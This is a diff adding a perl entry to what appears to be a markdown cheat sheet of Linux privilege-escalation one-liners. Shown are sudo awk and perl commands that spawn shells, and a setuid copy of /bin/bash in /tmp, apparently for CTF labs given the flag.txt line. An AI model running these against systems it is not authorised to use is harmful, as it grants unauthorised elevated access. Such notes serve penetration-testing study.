@@ -54,6 +54,9 @@ Poratble Database
 ##### sudo -u user awk 'BEGIN {system("/bin/bash")}'
 ##### sudo -u user awk {'print $1'} ~/flag.txt
 
+### Privilege Escalation abusing perl
+#### sudo -u victim perl -e 'exec "/bin/sh";'
+
 ### Privilege Escalation with cp and chmod
 #### Copy the /bin/bash to /tmp/test
 #### chmod +xs /tmp/test && ./test
